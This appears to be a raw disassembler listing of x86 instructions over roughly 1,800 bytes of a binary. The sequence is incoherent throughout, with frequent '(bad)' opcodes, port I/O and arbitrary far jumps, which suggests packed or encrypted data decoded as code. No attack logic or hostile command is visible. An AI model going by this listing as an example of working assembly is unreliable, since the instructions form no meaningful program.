  40ed83:	fisub  WORD PTR [edx]
  40ed85:	scas   al,BYTE PTR es:[edi]
  40ed86:	mov    ah,ch
  40ed88:	cmp    al,0x32
  40ed8a:	push   esp
  40ed8b:	rol    DWORD PTR ss:[esi],0xf1
  40ed8f:	cmp    eax,0x8e22d0b9
  40ed94:	ds jne 0x40ee11
  40ed97:	add    al,0x22
  40ed99:	cmp    eax,0xbe579adb
  40ed9e:	mov    WORD PTR [eax+0x0],ss
  40eda1:	sbb    edi,edi
  40eda3:	mov    bl,0xf1
  40eda5:	jbe    0x40ed32
  40eda7:	jp     0x40ed2e
  40eda9:	add    DWORD PTR [edx+0x50a96d34],0xffffffbe
  40edb0:	xchg   BYTE PTR [edi-0x19],ch
  40edb3:	mov    esp,DWORD PTR ss:[ebx-0x5af2091e]
  40edba:	data16 icebp 
  40edbc:	mov    cl,BYTE PTR [ebp+0x4c]
  40edbf:	adc    cl,ch
  40edc1:	aas    
  40edc2:	lods   eax,DWORD PTR ds:[esi]
  40edc3:	cmp    BYTE PTR [eax+0x40e46700],ah
  40edc9:	push   ebp
  40edca:	or     BYTE PTR [ebx],ah
  40edcc:	std    
  40edcd:	xchg   esi,eax
  40edce:	add    al,0x23
  40edd0:	sbb    al,0x36
  40edd2:	stos   BYTE PTR es:[edi],al
  40edd3:	mov    eax,0xd6bb5a5e
  40edd8:	add    al,0x72
  40edda:	cld    
  40eddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eddc:	mov    esi,0x6689797
  40ede1:	(bad)  
  40ede2:	mov    al,ds:0x24816190
  40ede7:	daa    
  40ede8:	mov    ds:0xfd689189,eax
  40eded:	sub    ah,BYTE PTR [edx-0x2d]
  40edf0:	cmp    cl,BYTE PTR [ebp-0x78b697c7]
  40edf6:	lock jl 0x40edb1
  40edf9:	neg    BYTE PTR [edi]
  40edfb:	or     ebp,DWORD PTR [ebp+0x7a]
  40edfe:	inc    edi
  40edff:	aam    0x91
  40ee01:	mov    es,WORD PTR [eax-0x16]
  40ee04:	push   es
  40ee05:	push   DWORD PTR [esi+0x3a5ec895]
  40ee0b:	xchg   DWORD PTR [ebp-0x2a1b5eb0],esp
  40ee11:	dec    esi
  40ee12:	pop    es
  40ee13:	pop    ecx
  40ee14:	pop    DWORD PTR [ebx]
  40ee16:	jl     0x40ed9a
  40ee18:	pop    ebp
  40ee19:	xchg   DWORD PTR [ecx+0x696a88bc],edx
  40ee1f:	mov    ds:0x47a5870c,al
  40ee24:	fld    QWORD PTR [edx-0x49dc31a0]
  40ee2a:	cwde   
  40ee2b:	pop    eax
  40ee2c:	mov    WORD PTR ds:0x750c6a5c,cs
  40ee32:	cmc    
  40ee33:	dec    edx
  40ee34:	jno    0x40edef
  40ee36:	or     eax,0x6a3694ac
  40ee3b:	dec    ebx
  40ee3c:	mov    eax,ds:0xfec04ea6
  40ee41:	jl     0x40ee87
  40ee43:	mov    BYTE PTR [edx+0x73c0f861],dl
  40ee49:	repz lea edx,[ecx+esi*4]
  40ee4d:	mov    ch,0x75
  40ee4f:	test   eax,0x2dfd7a3c
  40ee54:	je     0x40ee69
  40ee56:	jbe    0x40edf4
  40ee58:	in     al,0xc8
  40ee5a:	or     DWORD PTR [edx],0x59d8b1e6
  40ee60:	jl     0x40edf5
  40ee62:	in     al,0xef
  40ee64:	outs   dx,DWORD PTR ds:[esi]
  40ee65:	jno    0x40ee1a
  40ee67:	pop    edi
  40ee68:	jae    0x40ee5c
  40ee6a:	xchg   edx,eax
  40ee6b:	fucomip st,st(7)
  40ee6d:	rcr    BYTE PTR [ebx-0x6e],0xdc
  40ee71:	cli    
  40ee72:	lds    ebp,FWORD PTR [ebp+esi*8-0x5d]
  40ee76:	pusha  
  40ee77:	dec    eax
  40ee78:	fucomp st(1)
  40ee7a:	inc    esi
  40ee7b:	mov    ds:0xd4085d63,al
  40ee80:	retf   
  40ee81:	arpl   WORD PTR [esi],ax
  40ee83:	rcr    BYTE PTR [esp+ebp*1],cl
  40ee86:	pushf  
  40ee87:	or     eax,0x23bf9fef
  40ee8c:	shl    DWORD PTR [eax+ebp*8],1
  40ee8f:	shl    BYTE PTR [esi+0xe],1
  40ee92:	rcl    esp,1
  40ee94:	cmp    BYTE PTR [edi-0x72],dh
  40ee97:	ror    DWORD PTR [ebp+0x17],1
  40ee9a:	adc    ah,BYTE PTR [esi-0x4e]
  40ee9d:	fisub  DWORD PTR [ecx+0xb22e76]
  40eea3:	sbb    BYTE PTR [eax+0x7a0377eb],0x42
  40eeaa:	aaa    
  40eeab:	(bad)  
  40eeac:	push   ss
  40eead:	dec    ecx
  40eeae:	push   edx
  40eeaf:	pop    ecx
  40eeb0:	sub    eax,0x4fa27ffe
  40eeb5:	ret    
  40eeb6:	lods   eax,DWORD PTR ds:[esi]
  40eeb7:	sub    ch,0x73
  40eeba:	das    
  40eebb:	iret   
  40eebc:	scas   al,BYTE PTR es:[edi]
  40eebd:	jmp    0x40ef34
  40eebf:	jl     0x40ee54
  40eec1:	mov    cl,0xbe
  40eec3:	fcmovnbe st,st(7)
  40eec5:	shr    cl,0x4
  40eec8:	pushf  
  40eec9:	(bad)  
  40eeca:	neg    DWORD PTR [edi+eiz*2+0x12593c4]
  40eed1:	xchg   ebx,eax
  40eed2:	or     DWORD PTR [edi+0x56b76ac1],edi
  40eed8:	test   ebp,ebp
  40eeda:	inc    edx
  40eedb:	iret   
  40eedc:	cmp    DWORD PTR ds:0xc687f731,edi
  40eee2:	fld    DWORD PTR [eax+0x59f08ef5]
  40eee8:	aas    
  40eee9:	and    al,0xae
  40eeeb:	inc    ebx
  40eeec:	in     al,0x2a
  40eeee:	shl    esi,1
  40eef0:	xor    ah,BYTE PTR [edi+eiz*2]
  40eef3:	stc    
  40eef4:	sti    
  40eef5:	imul   ebx,esp,0xf6512ec4
  40eefb:	sub    eax,DWORD PTR [eax]
  40eefd:	xchg   ecx,eax
  40eefe:	outs   dx,DWORD PTR ds:[esi]
  40eeff:	mov    WORD PTR [edx+0x42],cs
  40ef02:	mov    edx,0x1cc5ef7c
  40ef07:	sub    DWORD PTR [ecx],ebx
  40ef09:	pop    edx
  40ef0a:	(bad)  
  40ef0b:	jmp    0xd9b0:0x411ec4fa
  40ef12:	add    al,0x67
  40ef14:	daa    
  40ef15:	lahf   
  40ef16:	in     al,dx
  40ef17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef18:	mov    ecx,0xc3ba82f3
  40ef1d:	stos   BYTE PTR es:[edi],al
  40ef1e:	in     al,0x4b
  40ef20:	loope  0x40eeb1
  40ef22:	dec    ebx
  40ef23:	add    al,0x50
  40ef25:	loopne 0x40ef03
  40ef27:	or     DWORD PTR [ebx+0x4db93309],edi
  40ef2d:	adc    eax,edi
  40ef2f:	lods   al,BYTE PTR ds:[esi]
  40ef30:	out    dx,al
  40ef31:	mov    al,ds:0x27f718d4
  40ef36:	sbb    eax,0xa0d84ef7
  40ef3b:	or     al,cl
  40ef3d:	push   ecx
  40ef3e:	cld    
  40ef3f:	sbb    bh,ah
  40ef41:	inc    esp
  40ef42:	jg     0x40ef5f
  40ef44:	push   ebp
  40ef45:	rcl    DWORD PTR [esi-0x28],0xb1
  40ef49:	scas   al,BYTE PTR es:[edi]
  40ef4a:	push   0xb79faca4
  40ef4f:	sub    ebp,ecx
  40ef51:	and    edi,DWORD PTR ds:0x1c4bd99c
  40ef57:	push   ss
  40ef58:	pop    edi
  40ef59:	jnp    0x40ef44
  40ef5b:	xor    esi,0x7959223c
  40ef61:	inc    ebx
  40ef62:	pop    esp
  40ef63:	mov    eax,0xd708c69d
  40ef68:	dec    eax
  40ef69:	int    0xc3
  40ef6b:	iret   
  40ef6c:	xchg   BYTE PTR [edi+eiz*1+0x2d818a5f],ch
  40ef73:	arpl   WORD PTR [edx-0x61],si
  40ef76:	imul   DWORD PTR [eax]
  40ef78:	mov    ebx,0xcc2c4c24
  40ef7d:	shl    BYTE PTR [ebp+ebx*8+0x57],0x4
  40ef82:	imul   ecx,DWORD PTR [ecx],0x5ae4586c
  40ef88:	or     DWORD PTR [ecx],0xffffffca
  40ef8b:	jb     0x40efbc
  40ef8d:	push   ecx
  40ef8e:	pop    edx
  40ef8f:	mov    ds:0xb89d18fe,al
  40ef94:	outs   dx,BYTE PTR ds:[esi]
  40ef95:	pushf  
  40ef96:	inc    ebx
  40ef97:	ins    DWORD PTR es:[edi],dx
  40ef98:	add    edi,esi
  40ef9a:	fwait
  40ef9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef9c:	cmp    eax,0x48e73f2c
  40efa1:	mov    BYTE PTR [esi],bh
  40efa3:	pop    ss
  40efa4:	adc    ebx,DWORD PTR [edx+0x37f681c0]
  40efaa:	add    esi,DWORD PTR [ebx+ebp*8+0x3386184a]
  40efb1:	pusha  
  40efb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb3:	xor    al,0xf3
  40efb5:	mov    ebx,0x2f7ab303
  40efba:	jne    0x40effd
  40efbc:	mov    eax,0x1beebe47
  40efc1:	xchg   edx,eax
  40efc2:	cmp    DWORD PTR [ebp+0x7348b335],esp
  40efc8:	mov    bl,0xf6
  40efca:	loop   0x40f023
  40efcc:	cmp    eax,DWORD PTR [esi]
  40efce:	sti    
  40efcf:	popf   
  40efd0:	adc    al,0x8c
  40efd2:	or     ch,BYTE PTR [ebp+0x62]
  40efd5:	(bad)  
  40efd6:	mov    BYTE PTR [esi-0x535ccc6e],dl
  40efdc:	ja     0x40f056
  40efde:	mov    ebx,0xd753ee64
  40efe3:	mov    al,BYTE PTR [ebx]
  40efe5:	and    al,0x7a
  40efe7:	push   edi
  40efe8:	mov    ch,0x2a
  40efea:	xchg   edx,eax
  40efeb:	scas   al,BYTE PTR es:[edi]
  40efec:	push   0xa9adcd06
  40eff1:	push   edx
  40eff2:	sub    DWORD PTR [edx],eax
  40eff4:	es xchg ah,al
  40eff7:	les    ebx,FWORD PTR [eax+0xa]
  40effa:	mov    eax,ds:0xb7ab6c03
  40efff:	(bad)  
  40f000:	and    al,0x47
  40f002:	adc    BYTE PTR [ecx+0x4c95c68e],bh
  40f008:	clc    
  40f009:	jns    0x40f047
  40f00b:	in     al,dx
  40f00c:	push   ss
  40f00d:	icebp  
  40f00e:	sub    al,0x67
  40f010:	imul   ebx,ebx,0xffffffd8
  40f013:	sub    BYTE PTR [edx+0x64],cl
  40f016:	sti    
  40f017:	mov    cl,0x97
  40f019:	dec    esp
  40f01a:	(bad)  
  40f01b:	lods   al,BYTE PTR ds:[esi]
  40f01c:	cld    
  40f01d:	mov    es,ebx
  40f01f:	cmp    edi,DWORD PTR [eax+0x33fa5f79]
  40f025:	xor    al,0xda
  40f027:	ds sbb al,0xa7
  40f02a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f02b:	xor    ah,BYTE PTR [ebp-0x670e8b]
  40f031:	mov    DWORD PTR ds:0xccb6ad67,edi
  40f037:	xchg   edx,eax
  40f038:	cmc    
  40f039:	cmc    
  40f03a:	cmp    DWORD PTR [ebp+esi*1-0x6efee118],esi
  40f041:	lds    eax,FWORD PTR [edi]
  40f043:	jb     0x40f00d
  40f045:	push   cs
  40f046:	push   edx
  40f047:	sbb    DWORD PTR [eax+edi*8+0x59],esi
  40f04b:	fst    DWORD PTR [eax-0x2d356c09]
  40f051:	pop    ebp
  40f052:	or     eax,0xeb18a2dc
  40f057:	in     eax,0x8
  40f059:	push   edx
  40f05a:	jne    0x40f04b
  40f05c:	and    dl,0x20
  40f05f:	(bad)  
  40f060:	fld    DWORD PTR [esp+ebx*8-0x57]
  40f064:	(bad)  
  40f066:	out    dx,eax
  40f067:	(bad)  
  40f068:	sbb    ah,al
  40f06a:	inc    eax
  40f06b:	addr16 inc ebp
  40f06d:	(bad)  
  40f06e:	ds mov al,0xc2
  40f071:	push   ds
  40f072:	mov    bl,0xea
  40f074:	xor    eax,0x68ea2e13
  40f079:	jmp    0x40f067
  40f07b:	mov    BYTE PTR [eax-0x15],dl
  40f07e:	push   eax
  40f07f:	aaa    
  40f080:	jp     0x40f070
  40f082:	push   edx
  40f083:	jecxz  0x40f0c7
  40f085:	add    al,0x76
  40f087:	xlat   BYTE PTR ds:[ebx]
  40f088:	add    BYTE PTR [ebp-0x69],dl
  40f08b:	aad    0x8a
  40f08d:	mov    dh,0x41
  40f08f:	xor    eax,0x80b8cfd8
  40f094:	(bad)  
  40f095:	or     DWORD PTR [edx+0x307533cd],ecx
  40f09b:	jp     0x40f067
  40f09d:	or     edx,DWORD PTR [ebx]
  40f09f:	dec    edi
  40f0a0:	push   edx
  40f0a1:	stc    
  40f0a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a3:	fisubr DWORD PTR [edx+0x43]
  40f0a6:	add    eax,0xf8458b1d
  40f0ab:	mov    cl,dl
  40f0ad:	or     eax,0x86e6aed5
  40f0b2:	cld    
  40f0b3:	in     eax,0xdf
  40f0b5:	stos   DWORD PTR es:[edi],eax
  40f0b6:	(bad)  
  40f0b7:	push   ebp
  40f0b8:	lods   eax,DWORD PTR ds:[esi]
  40f0b9:	data16 jno 0x40f0fc
  40f0bc:	scas   al,BYTE PTR es:[edi]
  40f0bd:	mov    WORD PTR [esi],es
  40f0bf:	repnz in eax,0x13
  40f0c2:	or     DWORD PTR [edi+0x74fd7ac5],esi
  40f0c8:	jns    0x40f0f7
  40f0ca:	mov    cl,0xaf
  40f0cc:	add    BYTE PTR [ebp+0x6b],dh
  40f0cf:	mov    esi,0xfae5d812
  40f0d4:	sbb    eax,0x82aa1e26
  40f0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0da:	pusha  
  40f0db:	fadd   DWORD PTR [ecx+0x3d]
  40f0de:	pop    esp
  40f0df:	push   ss
  40f0e0:	inc    ebx
  40f0e1:	sbb    BYTE PTR [edx+0x6e],al
  40f0e4:	lods   eax,DWORD PTR ds:[esi]
  40f0e5:	jbe    0x40f136
  40f0e7:	xchg   edx,esp
  40f0e9:	inc    ebx
  40f0ea:	cmp    esi,DWORD PTR [edi+0x23163775]
  40f0f0:	inc    ebp
  40f0f1:	xchg   edi,eax
  40f0f2:	adc    DWORD PTR [esi+0x11b96b14],ecx
  40f0f8:	mov    cl,BYTE PTR [eax+0x40]
  40f0fb:	data16 stos BYTE PTR es:[edi],al
  40f0fd:	push   cs
  40f0fe:	push   0xffffffaf
  40f100:	imul   edx,DWORD PTR [edx-0x32],0x982da1b6
  40f107:	scas   al,BYTE PTR es:[edi]
  40f108:	ja     0x40f10d
  40f10a:	dec    eax
  40f10b:	and    al,0x89
  40f10d:	dec    ebp
  40f10e:	aam    0x8b
  40f110:	inc    ebp
  40f111:	in     al,dx
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0xa7
  40f12a:	ins    BYTE PTR es:[edi],dx
  40f12b:	int    0xe9
  40f12d:	pop    ebp
  40f12e:	mov    ds:0x7d497070,eax
  40f133:	jo     0x40f1a5
  40f135:	mov    BYTE PTR [ecx-0x752ce31c],dh
  40f13b:	jmp    0x4f682f22
  40f140:	mov    ds:0x5453b404,al
  40f145:	mov    ch,0x78
  40f147:	or     eax,0x20a14d42
  40f14c:	rcl    ch,0xf3
  40f14f:	je     0x40f134
  40f151:	mov    ?,WORD PTR [edi]
  40f153:	lock mov bh,0x69
  40f156:	loope  0x40f15c
  40f158:	call   DWORD PTR ds:0x1c9b055d
  40f15e:	xor    DWORD PTR [edi-0x2c],esi
  40f161:	mov    ebx,0xc1541806
  40f166:	shl    BYTE PTR gs:[edx-0x5],1
  40f16a:	lea    edi,[edi-0x7cdea524]
  40f170:	xor    eax,DWORD PTR [ebp+0x4a]
  40f173:	in     eax,0xb3
  40f175:	push   ebx
  40f176:	pusha  
  40f177:	cmp    DWORD PTR [ecx-0x52],ebp
  40f17a:	pop    edi
  40f17b:	fistp  QWORD PTR [eax+esi*8-0x1e602cd0]
  40f182:	cmp    DWORD PTR [eax+edi*8],ebx
  40f185:	or     dh,BYTE PTR [ebx]
  40f187:	mov    ah,0xae
  40f189:	addr16 cli 
  40f18b:	popa   
  40f18c:	inc    eax
  40f18d:	test   DWORD PTR [esi+0x5f8d821c],esp
  40f193:	xor    al,0x79
  40f195:	mov    ah,0xcf
  40f197:	fs xchg edi,eax
  40f199:	bound  esp,QWORD PTR [ecx-0x60e817a1]
  40f19f:	xor    edi,DWORD PTR [ecx+0x3]
  40f1a2:	ins    DWORD PTR es:[edi],dx
  40f1a3:	mov    ah,0x52
  40f1a5:	ins    BYTE PTR es:[edi],dx
  40f1a6:	loop   0x40f1ab
  40f1a8:	das    
  40f1a9:	ret    0xafc9
  40f1ac:	xor    DWORD PTR [esi-0xa],0x62523953
  40f1b3:	jbe    0x40f1d8
  40f1b5:	dec    esp
  40f1b6:	push   0x1f
  40f1b8:	lods   eax,DWORD PTR ds:[esi]
  40f1b9:	inc    ebp
  40f1ba:	pop    ebx
  40f1bb:	xchg   edx,eax
  40f1bc:	out    dx,al
  40f1bd:	or     ebp,DWORD PTR [edi+eax*1-0x3a]
  40f1c1:	out    dx,eax
  40f1c2:	lar    edi,WORD PTR [edx+ebp*4-0x5189c7f3]
  40f1ca:	inc    esp
  40f1cb:	shl    BYTE PTR [ebp-0x7f],0xf0
  40f1cf:	loop   0x40f1a2
  40f1d1:	fisttp QWORD PTR [esp+esi*8+0x37]
  40f1d5:	push   ss
  40f1d6:	mov    esi,DWORD PTR [edx+0x635b9d78]
  40f1dc:	mov    cl,0xc4
  40f1de:	dec    ebx
  40f1df:	clc    
  40f1e0:	cmp    eax,0x50e8a65d
  40f1e5:	in     eax,0xd1
  40f1e7:	mov    edi,0x6a9c693f
  40f1ec:	je     0x40f1f6
  40f1ee:	dec    edi
  40f1ef:	dec    ecx
  40f1f0:	xchg   ecx,eax
  40f1f1:	pop    ebx
  40f1f2:	sub    eax,0xeb9bf17d
  40f1f7:	int3   
  40f1f8:	loop   0x40f244
  40f1fa:	shr    DWORD PTR [ecx-0x6e0c9d08],0x14
  40f201:	mov    dh,0x36
  40f203:	loop   0x40f1bf
  40f205:	sub    al,0xa8
  40f207:	aam    0x11
  40f209:	ret    
  40f20a:	lea    edi,[edx+0x6]
  40f20d:	int    0x58
  40f20f:	and    bh,dl
  40f211:	mov    eax,ds:0xdbda8cb5
  40f216:	pcmpgtw mm1,QWORD PTR [edi+ecx*4+0xe1f86a6]
  40f21e:	jmp    FWORD PTR [edi-0x41eab71c]
  40f224:	dec    ebx
  40f225:	mov    eax,ds:0x656f665e
  40f22a:	or     esp,0x68
  40f22d:	sbb    eax,0x52d4b1f8
  40f232:	aam    0x4d
  40f234:	inc    esi
  40f235:	stc    
  40f236:	bound  esi,QWORD PTR [edx+0x23]
  40f239:	ins    DWORD PTR es:[edi],dx
  40f23a:	popf   
  40f23b:	mov    ?,WORD PTR ds:0xdc48b963
  40f241:	xchg   edx,eax
  40f242:	cmp    BYTE PTR [eax],0xd0
  40f245:	xchg   edi,eax
  40f246:	mov    eax,DWORD PTR [eax-0x2e]
  40f249:	dec    ebp
  40f24a:	sbb    eax,0xdcd1aeb5
  40f24f:	mov    al,0xe5
  40f251:	mov    esp,0xf569a3c4
  40f256:	sahf   
  40f257:	shl    BYTE PTR [edi],cl
  40f259:	repz jmp 0x40f26c
  40f25c:	add    BYTE PTR [ecx-0x1353a29f],dl
  40f262:	mov    ds:0x6765f8d6,eax
  40f267:	or     al,ah
  40f269:	aad    0x35
  40f26b:	sub    al,0x86
  40f26d:	rdpmc  
  40f26f:	addr16 jg 0x40f264
  40f272:	pop    eax
  40f273:	popa   
  40f274:	xchg   DWORD PTR [edx],ebp
  40f276:	rol    BYTE PTR [esi-0x12],1
  40f279:	(bad)  
  40f27a:	pop    ebp
  40f27b:	push   eax
  40f27c:	mov    cl,0x63
  40f27e:	sub    eax,0x6e7367f4
  40f283:	fisttp WORD PTR [ecx*1-0x4d570435]
  40f28a:	lahf   
  40f28b:	out    0x2,eax
  40f28d:	les    eax,FWORD PTR [ebx-0x3]
  40f290:	xor    BYTE PTR [ecx],dl
  40f292:	iret   
  40f293:	popa   
  40f294:	(bad)  
  40f295:	xchg   ebx,eax
  40f296:	lods   eax,DWORD PTR ds:[esi]
  40f297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f298:	mov    al,ds:0x13bf4ddd
  40f29d:	fmul   st(5),st
  40f29f:	aam    0x14
  40f2a1:	das    
  40f2a2:	adc    eax,0xe9382958
  40f2a7:	jnp    0x40f26e
  40f2a9:	xchg   DWORD PTR [ecx+0x15089ae8],edi
  40f2af:	lods   eax,DWORD PTR ds:[esi]
  40f2b0:	sbb    ebx,0x3f4b0712
  40f2b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2b7:	dec    ebp
  40f2b8:	mov    ebx,0x9f5c22ec
  40f2bd:	inc    ebx
  40f2be:	mov    ah,dh
  40f2c0:	jmp    0xa876:0xb0655a43
  40f2c7:	dec    eax
  40f2c8:	push   cs
  40f2c9:	cmp    al,BYTE PTR [esi-0x30dd5732]
  40f2cf:	and    dh,bh
  40f2d1:	clc    
  40f2d2:	jae    0x40f264
  40f2d4:	idiv   DWORD PTR [esi+ebp*2+0x12dfb847]
  40f2db:	mov    al,ds:0xbf6c49fc
  40f2e0:	leave  
  40f2e1:	xchg   ebp,eax
  40f2e2:	ds cwde 
  40f2e4:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40f2e6:	mov    gs,WORD PTR [ebx+0xd]
  40f2e9:	mov    ecx,0x42194cb9
  40f2ee:	mov    dh,0xc7
  40f2f0:	in     eax,0xa1
  40f2f2:	in     eax,0x87
  40f2f4:	push   ecx
  40f2f5:	fisttp DWORD PTR [ebx-0x3]
  40f2f8:	js     0x40f28d
  40f2fa:	cmp    BYTE PTR [edi+0x70],ch
  40f2fd:	(bad)  
  40f2fe:	dec    eax
  40f2ff:	mov    al,0xee
  40f301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f302:	inc    esi
  40f303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f304:	lods   eax,DWORD PTR ds:[esi]
  40f305:	adc    DWORD PTR [esi+0x4d],0x66
  40f309:	je     0x40f34b
  40f30b:	inc    edx
  40f30c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f30d:	push   ebp
  40f30e:	add    eax,0x8e2f8cfe
  40f313:	mov    eax,0xe12d1a51
  40f318:	cli    
  40f319:	aad    0x12
  40f31b:	cwde   
  40f31c:	pusha  
  40f31d:	sar    bl,1
  40f31f:	jno    0x40f301
  40f321:	in     al,dx
  40f322:	add    ch,bh
  40f324:	aad    0xab
  40f326:	enter  0xfea,0xd1
  40f32a:	rol    DWORD PTR [eax-0x44adf3a5],0x72
  40f331:	sbb    al,0x95
  40f333:	sahf   
  40f334:	mov    cl,BYTE PTR [eax+0x1]
  40f337:	adc    esp,eax
  40f339:	dec    esp
  40f33a:	and    DWORD PTR [esi+0x11971fef],esp
  40f340:	and    ch,BYTE PTR [ecx+ebp*1]
  40f343:	xchg   ebx,eax
  40f344:	xor    esp,DWORD PTR [esi]
  40f346:	clc    
  40f347:	and    bh,BYTE PTR [edx+0x73]
  40f34a:	dec    ecx
  40f34b:	push   esi
  40f34c:	nop
  40f34d:	adc    esi,DWORD PTR [ebx-0x38ca356c]
  40f353:	les    ebp,FWORD PTR [ebx-0x1b270534]
  40f359:	loope  0x40f332
  40f35b:	push   cs
  40f35c:	sub    esp,ebx
  40f35e:	xor    al,0x71
  40f360:	nop
  40f361:	sub    BYTE PTR [ecx+ebx*4-0x41],cl
  40f365:	es dec esi
  40f367:	jmp    0x40f38b
  40f369:	sbb    esi,DWORD PTR [ebx+ebx*1+0x5a]
  40f36d:	mov    al,ds:0xa13e17c2
  40f372:	sub    ch,BYTE PTR [ebp-0x25]
  40f375:	inc    eax
  40f376:	mov    bh,0x65
  40f378:	out    dx,al
  40f379:	fwait
  40f37a:	push   ebx
  40f37b:	arpl   dx,cx
  40f37d:	loopne 0x40f380
  40f37f:	ds inc ebx
  40f381:	mov    ah,0x7c
  40f383:	mov    esi,0xf5105bb1
  40f388:	call   0xc47d:0x851a5781
  40f38f:	push   ecx
  40f390:	sbb    eax,0xa01f4cf3
  40f395:	neg    edi
  40f397:	shl    BYTE PTR [edi+ecx*8],cl
  40f39a:	or     DWORD PTR [ebx+0x17],0xffffffd9
  40f39e:	ror    BYTE PTR [edx+0x2726dc24],cl
  40f3a4:	(bad)  
  40f3a7:	stos   BYTE PTR es:[edi],al
  40f3a8:	and    BYTE PTR [ebx-0x4],al
  40f3ab:	dec    esp
  40f3ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3ad:	mov    WORD PTR [ebx],ds
  40f3af:	mov    dl,0x41
  40f3b1:	mov    esp,0x521cad8e
  40f3b6:	mov    bh,0x94
  40f3b8:	pop    ecx
  40f3ba:	mov    cl,0x1
  40f3bc:	sti    
  40f3bd:	out    dx,eax
  40f3be:	xor    ebx,ebp
  40f3c0:	rcr    BYTE PTR [edx+0x4c],0xc2
  40f3c4:	into   
  40f3c5:	jnp    0x40f446
  40f3c7:	clc    
  40f3c8:	cld    
  40f3c9:	mul    DWORD PTR [ebx+0x58]
  40f3cc:	cmp    ebp,DWORD PTR [esi]
  40f3ce:	gs jmp 0xbdec:0x46d91239
  40f3d6:	xchg   ebp,eax
  40f3d7:	dec    ecx
  40f3d8:	repnz stc 
  40f3da:	push   edx
  40f3db:	js     0x40f3c3
  40f3dd:	in     al,dx
  40f3de:	mov    ebp,DWORD PTR [ecx]
  40f3e0:	xchg   esi,eax
  40f3e1:	outs   dx,DWORD PTR ds:[esi]
  40f3e2:	sbb    al,0x7e
  40f3e4:	lsl    edx,WORD PTR [ecx-0x7f4d2c98]
  40f3eb:	jle    0x40f3f7
  40f3ed:	or     DWORD PTR [esi+0x16],0x799796b8
  40f3f4:	repz xor BYTE PTR fs:[ecx-0x80],ch
  40f3f9:	repnz or esi,esp
  40f3fc:	jle    0x40f430
  40f3fe:	test   al,0x66
  40f400:	stos   BYTE PTR es:[edi],al
  40f401:	ret    
  40f402:	(bad)  
  40f404:	mov    al,ds:0x409ee108
  40f409:	xor    bh,BYTE PTR [ecx-0x6483d6bc]
  40f40f:	das    
  40f410:	lahf   
  40f411:	push   ecx
  40f412:	stos   DWORD PTR es:[edi],eax
  40f413:	dec    esi
  40f414:	xor    eax,DWORD PTR [ebx+0x16]
  40f417:	sub    DWORD PTR [eax],eax
  40f419:	xor    bl,0x4a
  40f41c:	sti    
  40f41d:	add    cl,BYTE PTR ds:[edx+eiz*2-0x57e2dbc0]
  40f425:	iret   
  40f426:	xchg   esp,eax
  40f427:	imul   edx,DWORD PTR [esi-0x7d],0xab3b47b7
  40f42e:	sbb    BYTE PTR [esi],dh
  40f430:	jnp    0x40f3e6
  40f432:	outs   dx,BYTE PTR ds:[esi]
  40f433:	aad    0x17
  40f435:	arpl   WORD PTR [ebx+0x363306bf],di
  40f43b:	pop    ss
  40f43c:	pop    edx
  40f43d:	cmp    al,0x84
  40f43f:	iret   
  40f440:	dec    ecx
  40f441:	xchg   DWORD PTR [esi-0x723e3433],esi
  40f447:	push   edi
  40f448:	lock mov edx,0x3b654cd4
  40f44e:	ins    BYTE PTR es:[edi],dx
  40f44f:	mov    edi,0xa0626e80
  40f454:	add    dl,dl
  40f456:	rcl    ah,1
  40f458:	jge    0x40f4cc
  40f45a:	xchg   edi,eax
  40f45b:	mov    dh,0xd2
  40f45d:	inc    ebp
  40f45e:	repnz out dx,eax
  40f460:	sub    eax,0x8ac1eba6
  40f465:	in     eax,0xf3
  40f467:	xchg   esi,eax
  40f468:	add    eax,0x8dbcafe9
  40f46d:	les    ebp,FWORD PTR [ecx]
  40f46f:	sbb    al,0xbb
  40f471:	and    edx,DWORD PTR [ebx-0x51]
  40f474:	push   eax
  40f475:	xchg   edi,eax
  40f476:	lahf   
  40f477:	jecxz  0x40f435
  40f479:	sbb    eax,0x76105541
  40f47e:	jle    0x40f4fb
  40f480:	rcr    DWORD PTR [edi],0xc2
  40f483:	sti    
  40f484:	push   ebp
  40f485:	(bad)  
  40f486:	gs push ecx
  40f488:	adc    esp,DWORD PTR [eax-0x7337c9a8]
  40f48e:	push   cs
  40f48f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f490:	ficomp WORD PTR [esi+0x1f67d2d8]
  40f496:	sbb    al,0xdf
  40f498:	fidivr DWORD PTR [eax+0x61]
  40f49b:	jno    0x40f421
  40f49d:	pushf  
  40f49e:	xchg   edx,eax
  40f49f:	mov    ch,0x7c
  40f4a1:	inc    edi
  40f4a2:	repnz dec ecx
  40f4a4:	xor    DWORD PTR [edx],eax
  40f4a6:	adc    bl,bh
  40f4a8:	sub    esi,DWORD PTR [eax-0x26c927b4]
  40f4ae:	loopne 0x40f4e5
  40f4b0:	pop    ebx
  40f4b1:	int3   
  40f4b2:	cmc    
  40f4b3:	xor    DWORD PTR [esi+0x4e],0x14
  40f4b7:	in     eax,dx
  40f4b8:	jg     0x40f4b6
  40f4ba:	jns    0x40f496
  40f4bc:	pop    ebp
  40f4bd:	jnp    0x40f533
  40f4bf:	dec    edx
  40f4c0:	(bad)  
  40f4c1:	out    0xd6,al
